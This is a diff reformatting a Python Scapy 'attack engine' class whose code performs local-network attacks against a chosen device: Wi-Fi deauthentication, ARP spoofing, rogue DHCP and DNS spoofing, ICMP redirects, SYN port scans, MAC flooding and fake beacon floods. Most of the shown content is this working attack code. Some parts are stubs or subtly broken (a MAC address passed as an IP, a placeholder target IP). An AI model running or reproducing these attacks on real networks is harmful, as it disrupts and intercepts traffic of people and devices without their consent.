@@ -9,9 +9,26 @@ import time
 from typing import ClassVar
 
 from scapy.all import (
-    ARP, Ether, RadioTap, Dot11, Dot11Deauth, Dot11Beacon, Dot11Elt,
-    IP, ICMP, UDP, DNS, DNSQR, DHCP, BOOTP,
-    sendp, send, conf, get_if_hwaddr, sniff, get_if_list
+    ARP,
+    BOOTP,
+    DHCP,
+    DNS,
+    DNSQR,
+    ICMP,
+    IP,
+    TCP,
+    UDP,
+    Dot11,
+    Dot11Beacon,
+    Dot11Deauth,
+    Dot11Elt,
+    Ether,
+    RadioTap,
+    conf,
+    get_if_hwaddr,
+    send,
+    sendp,
+    sniff,
 )
 
 from app.core.engine.base import AttackEngine
@@ -40,7 +57,7 @@ class ScapyAttackEngine(AttackEngine):
             # On Linux, check for NET_RAW capability via /proc/self/status
             # This works even in Docker containers with NET_RAW capability
             try:
-                with open("/proc/self/status", "r") as f:
+                with open("/proc/self/status") as f:
                     for line in f:
                         if line.startswith("CapEff:"):
                             # Parse capability effective set (hex)
@@ -57,6 +74,7 @@ class ScapyAttackEngine(AttackEngine):
             if sys.platform == "win32":
                 try:
                     import ctypes
+
                     return ctypes.windll.shell32.IsUserAnAdmin() != 0
                 except Exception:
                     return False
@@ -103,7 +121,9 @@ class ScapyAttackEngine(AttackEngine):
             logger.info(f"[ScapyEngine] Stopping attack on {target_mac}")
             self._running_attacks[target_mac] = False
         else:
-            logger.debug(f"[ScapyEngine] No active attack found for {target_mac} to stop")
+            logger.debug(
+                f"[ScapyEngine] No active attack found for {target_mac} to stop"
+            )
 
     async def scan_network(self) -> list[tuple[str, str]]:
         """
@@ -112,26 +132,29 @@ class ScapyAttackEngine(AttackEngine):
         Platform-aware implementation for Linux, macOS, and Windows.
         """
         if not self.check_permissions():
-            logger.warning("Scapy scan requires root/admin. Falling back to passive/table scan.")
+            logger.warning(
+                "Scapy scan requires root/admin. Falling back to passive/table scan."
+            )
             return []
 
         logger.info("[ScapyEngine] Starting active ARP scan...")
-        
+
         try:
             import sys
+
             from app.core.engine.features_macos import MacOSNetworkFeatures
-            
+
             # Platform-specific gateway detection
             gw_ip = None
             subnet = None
             iface = None
-            
+
             if sys.platform == "darwin":
                 # macOS-specific detection
                 macos_features = MacOSNetworkFeatures()
                 gw_ip = await macos_features.get_gateway_ip()
                 iface = await macos_features.get_default_interface()
-                
+
                 if iface and gw_ip:
                     # Get subnet mask and calculate CIDR
                     mask = await macos_features.get_subnet_mask(iface)
@@ -141,15 +164,22 @@ class ScapyAttackEngine(AttackEngine):
                 try:
                     # Use ipconfig to get default gateway on Windows
                     import asyncio
+
                     result = await asyncio.create_subprocess_exec(
                         "ipconfig",
                         stdout=asyncio.subprocess.PIPE,
                         stderr=asyncio.subprocess.PIPE,
-                        creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
+                        creationflags=(
+                            subprocess.CREATE_NO_WINDOW
+                            if sys.platform == "win32"
+                            else 0
+                        ),
                     )
-                    stdout, _ = await asyncio.wait_for(result.communicate(), timeout=5.0)
-                    output = stdout.decode('utf-8', errors='ignore')
-                    
+                    stdout, _ = await asyncio.wait_for(
+                        result.communicate(), timeout=5.0
+                    )
+                    output = stdout.decode("utf-8", errors="ignore")
+
                     # Parse gateway from ipconfig output
                     # Format: Default Gateway . . . . . . . . . : 192.168.1.1
                     for line in output.splitlines():
@@ -158,17 +188,21 @@ class ScapyAttackEngine(AttackEngine):
                             if len(parts) >= 2:
                                 gw_ip = parts[-1].strip()
                                 break
-                    
+
                     # Get interface from route table
                     try:
                         gw_route = conf.route.route("0.0.0.0")
                         iface = gw_route[3]  # Interface name
                     except Exception:
                         # Fallback: use first available interface
-                        iface = list(conf.ifaces.values())[0].name if conf.ifaces else None
-                        
+                        iface = (
+                            list(conf.ifaces.values())[0].name if conf.ifaces else None
+                        )
+
                 except Exception as e:
-                    logger.warning(f"[ScapyEngine] Failed to determine gateway on Windows: {e}")
+                    logger.warning(
+                        f"[ScapyEngine] Failed to determine gateway on Windows: {e}"
+                    )
             else:
                 # Linux detection (original logic)
                 try:
@@ -179,35 +213,38 @@ class ScapyAttackEngine(AttackEngine):
                         gw_ip = gw_route[2]
                     iface = conf.iface
                 except Exception as e:
-                    logger.warning(f"[ScapyEngine] Failed to determine gateway via route: {e}")
+                    logger.warning(
+                        f"[ScapyEngine] Failed to determine gateway via route: {e}"
+                    )
                     gw_ip = None
 
             if not gw_ip:
                 logger.warning("Could not determine gateway IP for scan.")
                 return []
-            
+
             # Default to /24 if subnet not calculated
             if not subnet:
                 subnet = ".".join(gw_ip.split(".")[:3]) + ".0/24"
-            
+
             logger.info(f"[ScapyEngine] Scanning subnet {subnet} on interface {iface}")
-            
+
             # Let's use the blocking srp call in thread
             def _arp_scan():
                 from scapy.all import srp
+
                 # srp sends and receives at layer 2
                 # On macOS, use the detected interface explicitly
                 scan_iface = iface if iface else conf.iface
                 logger.debug(f"[ScapyEngine] Using interface: {scan_iface}")
-                
+
                 ans, _ = srp(
-                    Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=subnet),
+                    Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet),
                     timeout=2,
                     verbose=False,
-                    iface=scan_iface
+                    iface=scan_iface,
                 )
                 results = []
-                for snd, rcv in ans:
+                for _snd, rcv in ans:
                     results.append((rcv.psrc, rcv.hwsrc))
                 return results
 
@@ -223,18 +260,25 @@ class ScapyAttackEngine(AttackEngine):
         Requires monitor mode interface.
         """
         logger.info(f"[ScapyEngine] Starting Deauth attack on {target_mac}")
-        
+
         # Detect monitor interface (simplistic detection)
         iface = conf.iface
         # TODO: Better monitor mode detection
-        # For now, we assume the default interface supports injection or user configured it
-        
+        # For now, assume default interface supports injection
+        # or user configured it
+
         # Construct Deauth frame
         # Reason 7: Class 3 frame received from nonassociated station
-        pkt = RadioTap() / Dot11(addr1=target_mac, addr2=get_if_hwaddr(iface), addr3=get_if_hwaddr(iface)) / Dot11Deauth(reason=7)
+        pkt = (
+            RadioTap()
+            / Dot11(
+                addr1=target_mac, addr2=get_if_hwaddr(iface), addr3=get_if_hwaddr(iface)
+            )
+            / Dot11Deauth(reason=7)
+        )
 
         end_time = time.time() + duration
-        
+
         while time.time() < end_time:
             if not self._running_attacks.get(target_mac):
                 logger.info(f"[ScapyEngine] Deauth attack on {target_mac} aborted")
@@ -245,15 +289,17 @@ class ScapyAttackEngine(AttackEngine):
                 # Send burst of packets
                 # Run in thread to avoid blocking event loop, with timeout
                 await asyncio.wait_for(
-                    asyncio.to_thread(sendp, pkt, iface=iface, count=5, inter=0.1, verbose=False),
-                    timeout=2.0
+                    asyncio.to_thread(
+                        sendp, pkt, iface=iface, count=5, inter=0.1, verbose=False
+                    ),
+                    timeout=2.0,
                 )
-            except asyncio.TimeoutError:
-                logger.warning(f"[ScapyEngine] Packet send timed out, continuing...")
+            except TimeoutError:
+                logger.warning("[ScapyEngine] Packet send timed out, continuing...")
             except Exception as e:
                 logger.error(f"[ScapyEngine] Error sending packet: {e}")
                 # Continue even if one packet fails
-            
+
             # Sleep a bit to allow other tasks (check cancellation more frequently)
             await asyncio.sleep(1)
 
@@ -270,9 +316,10 @@ class ScapyAttackEngine(AttackEngine):
             gateway_ip = conf.route.route("0.0.0.0")[2]
             iface = conf.iface
             my_mac = get_if_hwaddr(iface)
-            
+
             # 1. Spoof Target: "Gateway is at My MAC"
-            # This causes target to send traffic to us. If we don't forward, it's a block (DoS).
+            # This causes target to send traffic to us.
+            # If we don't forward, it's a block (DoS).
             # If we forward, it's MitM. Here we just want to BLOCK (Interfere).
             # Create ARP packet with Ether layer to specify destination MAC
             # op=2 means ARP reply (is-at)
@@ -281,13 +328,13 @@ class ScapyAttackEngine(AttackEngine):
                 pdst=gateway_ip,  # Target thinks gateway is asking
                 psrc=gateway_ip,  # Spoofed source IP (gateway)
                 hwdst=target_mac,  # Target MAC (destination)
-                hwsrc=my_mac  # Our MAC (spoofed as gateway)
+                hwsrc=my_mac,  # Our MAC (spoofed as gateway)
             )
             # Wrap in Ether layer with target MAC as destination
             packet = Ether(dst=target_mac, src=my_mac) / arp_packet
-            
+
             end_time = time.time() + duration
-            
+
             while time.time() < end_time:
                 if not self._running_attacks.get(target_mac):
                     logger.info(f"[ScapyEngine] ARP attack on {target_mac} aborted")
@@ -298,17 +345,20 @@ class ScapyAttackEngine(AttackEngine):
                     # Send spoof packet with timeout using sendp (layer 2)
                     await asyncio.wait_for(
                         asyncio.to_thread(sendp, packet, iface=iface, verbose=False),
-                        timeout=2.0
+                        timeout=2.0,
                     )
-                except asyncio.TimeoutError:
-                    logger.warning(f"[ScapyEngine] ARP packet send timed out, continuing...")
+                except TimeoutError:
+                    logger.warning(
+                        "[ScapyEngine] ARP packet send timed out, continuing..."
+                    )
                 except Exception as e:
                     logger.error(f"[ScapyEngine] Error sending ARP packet: {e}")
                     # Continue even if one packet fails
-                
-                # Sleep interval (ARP cache timeout is usually 60s, but we spam every 2s to be sure)
+
+                # Sleep interval (ARP cache timeout is usually 60s,
+                # but we spam every 2s to be sure)
                 await asyncio.sleep(2)
-                
+
         except Exception as e:
             logger.error(f"[ScapyEngine] ARP attack failed: {e}")
             raise
@@ -318,11 +368,11 @@ class ScapyAttackEngine(AttackEngine):
             logger.info(f"[ScapyEngine] Restoring ARP table for {target_mac}")
             try:
                 # Tell target the real gateway MAC
-                # We might not know real gateway MAC easily without scanning, 
+                # We might not know real gateway MAC easily without scanning,
                 # so we broadcast or just stop spoofing.
                 # For proper restore, we'd need gateway MAC.
                 # Here we simply stop interfering.
-                pass 
+                pass
             except Exception as e:
                 logger.error(f"[ScapyEngine] Failed to restore ARP: {e}")
 
@@ -332,34 +382,34 @@ class ScapyAttackEngine(AttackEngine):
         Responds to DHCP requests with malicious DHCP offers.
         """
         logger.info(f"[ScapyEngine] Starting DHCP Spoof attack on {target_mac}")
-        
+
         try:
             iface = conf.iface
             my_mac = get_if_hwaddr(iface)
-            
+
             # Get gateway IP
             gateway_ip = conf.route.route("0.0.0.0")[2]
             # Use a different IP for the fake DHCP server
             fake_dhcp_ip = gateway_ip  # Or use a controlled IP
-            
+
             end_time = time.time() + duration
-            
+
             # Sniff for DHCP requests and respond with spoofed offers
             def handle_dhcp(packet):
                 if DHCP in packet and packet[DHCP].options[0][1] == 1:  # DHCP Discover
                     # Create spoofed DHCP Offer
                     offer = (
-                        Ether(dst=packet[Ether].src, src=my_mac) /
-                        IP(src=fake_dhcp_ip, dst=packet[IP].dst) /
-                        UDP(sport=67, dport=68) /
-                        BOOTP(
+                        Ether(dst=packet[Ether].src, src=my_mac)
+                        / IP(src=fake_dhcp_ip, dst=packet[IP].dst)
+                        / UDP(sport=67, dport=68)
+                        / BOOTP(
                             op=2,  # BOOTP reply
                             xid=packet[BOOTP].xid,
                             yiaddr=packet[IP].dst,  # Offer this IP
                             siaddr=fake_dhcp_ip,
-                            chaddr=packet[BOOTP].chaddr
-                        ) /
-                        DHCP(
+                            chaddr=packet[BOOTP].chaddr,
+                        )
+                        / DHCP(
                             options=[
                                 ("message-type", "offer"),
                                 ("server_id", fake_dhcp_ip),
@@ -367,12 +417,12 @@ class ScapyAttackEngine(AttackEngine):
                                 ("subnet_mask", "255.255.255.0"),
                                 ("router", fake_dhcp_ip),  # Redirect gateway
                                 ("name_server", fake_dhcp_ip),  # Redirect DNS
-                                "end"
+                                "end",
                             ]
                         )
                     )
                     sendp(offer, iface=iface, verbose=False)
-            
+
             # Start sniffing in background
             sniff_task = asyncio.create_task(
                 asyncio.to_thread(
@@ -380,18 +430,20 @@ class ScapyAttackEngine(AttackEngine):
                     filter="udp and port 67",
                     prn=handle_dhcp,
                     stop_filter=lambda x: time.time() >= end_time,
-                    timeout=duration
+                    timeout=duration,
                 )
             )
-            
+
             while time.time() < end_time:
                 if not self._running_attacks.get(target_mac):
-                    logger.info(f"[ScapyEngine] DHCP Spoof attack on {target_mac} aborted")
+                    logger.info(
+                        f"[ScapyEngine] DHCP Spoof attack on {target_mac} aborted"
+                    )
                     break
                 await asyncio.sleep(1)
-            
+
             sniff_task.cancel()
-            
+
         except Exception as e:
             logger.error(f"[ScapyEngine] DHCP Spoof attack failed: {e}")
             raise
@@ -402,25 +454,25 @@ class ScapyAttackEngine(AttackEngine):
         Intercepts DNS queries and responds with malicious IPs.
         """
         logger.info(f"[ScapyEngine] Starting DNS Spoof attack on {target_mac}")
-        
+
         try:
             iface = conf.iface
             my_mac = get_if_hwaddr(iface)
-            
+
             # Get target IP from ARP table or device state
             # For now, we'll use a generic approach
             redirect_ip = "127.0.0.1"  # Redirect to localhost (block)
-            
+
             end_time = time.time() + duration
-            
+
             def handle_dns(packet):
                 if DNS in packet and packet[DNS].qr == 0:  # DNS Query
                     # Create spoofed DNS response
                     spoofed_dns = (
-                        Ether(dst=packet[Ether].src, src=my_mac) /
-                        IP(src=packet[IP].dst, dst=packet[IP].src) /
-                        UDP(sport=packet[UDP].dport, dport=packet[UDP].sport) /
-                        DNS(
+                        Ether(dst=packet[Ether].src, src=my_mac)
+                        / IP(src=packet[IP].dst, dst=packet[IP].src)
+                        / UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)
+                        / DNS(
                             id=packet[DNS].id,
                             qr=1,  # Response
                             aa=1,
@@ -428,12 +480,12 @@ class ScapyAttackEngine(AttackEngine):
                             an=DNSQR(
                                 rrname=packet[DNS].qd.qname,
                                 rdata=redirect_ip,
-                                type=packet[DNS].qd.qtype
-                            )
+                                type=packet[DNS].qd.qtype,
+                            ),
                         )
                     )
                     sendp(spoofed_dns, iface=iface, verbose=False)
-            
+
             # Start sniffing DNS queries
             sniff_task = asyncio.create_task(
                 asyncio.to_thread(
@@ -441,18 +493,20 @@ class ScapyAttackEngine(AttackEngine):
                     filter="udp and port 53",
                     prn=handle_dns,
                     stop_filter=lambda x: time.time() >= end_time,
-                    timeout=duration
+                    timeout=duration,
                 )
             )
-            
+
             while time.time() < end_time:
                 if not self._running_attacks.get(target_mac):
-                    logger.info(f"[ScapyEngine] DNS Spoof attack on {target_mac} aborted")
+                    logger.info(
+                        f"[ScapyEngine] DNS Spoof attack on {target_mac} aborted"
+                    )
                     break
                 await asyncio.sleep(1)
-            
+
             sniff_task.cancel()
-            
+
         except Exception as e:
             logger.error(f"[ScapyEngine] DNS Spoof attack failed: {e}")
             raise
@@ -463,45 +517,49 @@ class ScapyAttackEngine(AttackEngine):
         Sends ICMP redirect messages to manipulate routing.
         """
         logger.info(f"[ScapyEngine] Starting ICMP Redirect attack on {target_mac}")
-        
+
         try:
             iface = conf.iface
             my_mac = get_if_hwaddr(iface)
             gateway_ip = conf.route.route("0.0.0.0")[2]
-            
+
             # Get target IP (simplified - would need device lookup)
             # For now, we'll redirect to our own IP
             redirect_to_ip = conf.iface.ip
-            
+
             end_time = time.time() + duration
-            
+
             while time.time() < end_time:
                 if not self._running_attacks.get(target_mac):
-                    logger.info(f"[ScapyEngine] ICMP Redirect attack on {target_mac} aborted")
+                    logger.info(
+                        f"[ScapyEngine] ICMP Redirect attack on {target_mac} aborted"
+                    )
                     break
-                
+
                 # Send ICMP redirect message
                 # Redirect type 5: Redirect datagram for the Network
                 redirect_packet = (
-                    Ether(dst=target_mac, src=my_mac) /
-                    IP(src=gateway_ip, dst=target_mac) /
-                    ICMP(type=5, code=1, gw=redirect_to_ip) /  # Redirect for host
-                    IP(src=target_mac, dst="8.8.8.8") /  # Original packet
-                    ICMP(type=8)  # Echo request
+                    Ether(dst=target_mac, src=my_mac)
+                    / IP(src=gateway_ip, dst=target_mac)
+                    / ICMP(type=5, code=1, gw=redirect_to_ip)  # Redirect for host
+                    / IP(src=target_mac, dst="8.8.8.8")  # Original packet
+                    / ICMP(type=8)  # Echo request
                 )
-                
+
                 try:
                     await asyncio.wait_for(
-                        asyncio.to_thread(sendp, redirect_packet, iface=iface, verbose=False),
-                        timeout=2.0
+                        asyncio.to_thread(
+                            sendp, redirect_packet, iface=iface, verbose=False
+                        ),
+                        timeout=2.0,
                     )
-                except asyncio.TimeoutError:
-                    logger.warning(f"[ScapyEngine] ICMP Redirect packet send timed out")
+                except TimeoutError:
+                    logger.warning("[ScapyEngine] ICMP Redirect packet send timed out")
                 except Exception as e:
                     logger.error(f"[ScapyEngine] Error sending ICMP Redirect: {e}")
-                
+
                 await asyncio.sleep(5)  # Send every 5 seconds
-                
+
         except Exception as e:
             logger.error(f"[ScapyEngine] ICMP Redirect attack failed: {e}")
             raise
@@ -512,45 +570,48 @@ class ScapyAttackEngine(AttackEngine):
         Scans common ports on the target device.
         """
         logger.info(f"[ScapyEngine] Starting Port Scan on {target_mac}")
-        
+
         try:
             # Get target IP from device state or ARP table
             # For now, we'll use a placeholder
             target_ip = None  # Would need to resolve from MAC
-            
+
             if not target_ip:
-                logger.warning(f"[ScapyEngine] Cannot resolve IP for {target_mac}, skipping port scan")
+                logger.warning(
+                    f"[ScapyEngine] Cannot resolve IP for {target_mac}, "
+                    f"skipping port scan"
+                )
                 return
-            
+
             # Common ports to scan
             common_ports = [22, 23, 80, 443, 8080, 3389, 5900]
-            
+
             end_time = time.time() + duration
             scanned = set()
-            
+
             while time.time() < end_time and len(scanned) < len(common_ports):
                 if not self._running_attacks.get(target_mac):
                     logger.info(f"[ScapyEngine] Port Scan on {target_mac} aborted")
                     break
-                
+
                 for port in common_ports:
                     if port in scanned:
                         continue
-                    
+
                     # Send SYN packet
                     syn_packet = IP(dst=target_ip) / TCP(dport=port, flags="S")
-                    
+
                     try:
                         await asyncio.wait_for(
                             asyncio.to_thread(send, syn_packet, verbose=False),
-                            timeout=1.0
+                            timeout=1.0,
                         )
                         scanned.add(port)
                     except Exception as e:
                         logger.debug(f"[ScapyEngine] Port scan error for {port}: {e}")
-                    
+
                     await asyncio.sleep(0.5)  # Rate limit
-                
+
         except Exception as e:
             logger.error(f"[ScapyEngine] Port Scan failed: {e}")
             raise
@@ -561,19 +622,22 @@ class ScapyAttackEngine(AttackEngine):
         Uses iptables/tc to limit bandwidth for the target.
         """
         logger.info(f"[ScapyEngine] Starting Traffic Shaping on {target_mac}")
-        
+
         # Traffic shaping is typically done at the OS level, not via Scapy
         # This would require iptables/tc commands
         # For now, we log that it would be applied
-        logger.info(f"[ScapyEngine] Traffic shaping for {target_mac} would be applied via iptables/tc")
-        
+        logger.info(
+            f"[ScapyEngine] Traffic shaping for {target_mac} "
+            f"would be applied via iptables/tc"
+        )
+
         # In a real implementation, this would:
         # 1. Get target IP from MAC
         # 2. Apply iptables/tc rules to limit bandwidth
         # 3. Monitor and adjust
-        
+
         end_time = time.time() + duration
-        
+
         while time.time() < end_time:
             if not self._running_attacks.get(target_mac):
                 logger.info(f"[ScapyEngine] Traffic Shaping on {target_mac} aborted")
@@ -586,36 +650,39 @@ class ScapyAttackEngine(AttackEngine):
         Floods switch CAM table with fake MAC addresses.
         """
         logger.info(f"[ScapyEngine] Starting MAC Flood attack on {target_mac}")
-        
+
         try:
             iface = conf.iface
-            my_mac = get_if_hwaddr(iface)
-            
+
             import random
-            
+
             end_time = time.time() + duration
-            
+
             while time.time() < end_time:
                 if not self._running_attacks.get(target_mac):
-                    logger.info(f"[ScapyEngine] MAC Flood attack on {target_mac} aborted")
+                    logger.info(
+                        f"[ScapyEngine] MAC Flood attack on {target_mac} aborted"
+                    )
                     break
-                
+
                 # Generate random MAC addresses
                 fake_mac = ":".join([f"{random.randint(0, 255):02x}" for _ in range(6)])
-                
+
                 # Send packet with fake source MAC
                 flood_packet = Ether(src=fake_mac, dst=target_mac) / IP() / ICMP()
-                
+
                 try:
                     await asyncio.wait_for(
-                        asyncio.to_thread(sendp, flood_packet, iface=iface, verbose=False),
-                        timeout=0.1
+                        asyncio.to_thread(
+                            sendp, flood_packet, iface=iface, verbose=False
+                        ),
+                        timeout=0.1,
                     )
                 except Exception:
                     pass  # Ignore errors in flooding
-                
+
                 await asyncio.sleep(0.01)  # High rate
-                
+
         except Exception as e:
             logger.error(f"[ScapyEngine] MAC Flood attack failed: {e}")
             raise
@@ -626,49 +693,55 @@ class ScapyAttackEngine(AttackEngine):
         Floods the area with fake AP beacons to confuse clients.
         """
         logger.info(f"[ScapyEngine] Starting Beacon Flood attack on {target_mac}")
-        
+
         try:
             iface = conf.iface
-            my_mac = get_if_hwaddr(iface)
-            
+
             import random
             import string
-            
+
             end_time = time.time() + duration
-            
+
             while time.time() < end_time:
                 if not self._running_attacks.get(target_mac):
-                    logger.info(f"[ScapyEngine] Beacon Flood attack on {target_mac} aborted")
+                    logger.info(
+                        f"[ScapyEngine] Beacon Flood attack on {target_mac} aborted"
+                    )
                     break
-                
+
                 # Generate random SSID
-                fake_ssid = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
-                fake_bssid = ":".join([f"{random.randint(0, 255):02x}" for _ in range(6)])
-                
+                fake_ssid = "".join(
+                    random.choices(string.ascii_letters + string.digits, k=8)
+                )
+                fake_bssid = ":".join(
+                    [f"{random.randint(0, 255):02x}" for _ in range(6)]
+                )
+
                 # Create beacon frame
                 # Dot11Elt is used for Information Elements (IE) like SSID
                 beacon = (
-                    RadioTap() /
-                    Dot11(
-                        type=0, subtype=8,  # Management, Beacon
+                    RadioTap()
+                    / Dot11(
+                        type=0,
+                        subtype=8,  # Management, Beacon
                         addr1="ff:ff:ff:ff:ff:ff",  # Broadcast
                         addr2=fake_bssid,
-                        addr3=fake_bssid
-                    ) /
-                    Dot11Beacon(cap=0x1104) /
-                    Dot11Elt(ID="SSID", info=fake_ssid)  # SSID Information Element
+                        addr3=fake_bssid,
+                    )
+                    / Dot11Beacon(cap=0x1104)
+                    / Dot11Elt(ID="SSID", info=fake_ssid)  # SSID Information Element
                 )
-                
+
                 try:
                     await asyncio.wait_for(
                         asyncio.to_thread(sendp, beacon, iface=iface, verbose=False),
-                        timeout=0.1
+                        timeout=0.1,
                     )
                 except Exception as e:
                     logger.debug(f"[ScapyEngine] Beacon send error: {e}")
-                
+
                 await asyncio.sleep(0.1)  # Send beacons rapidly
-                
+
         except Exception as e:
             logger.error(f"[ScapyEngine] Beacon Flood attack failed: {e}")
             raise
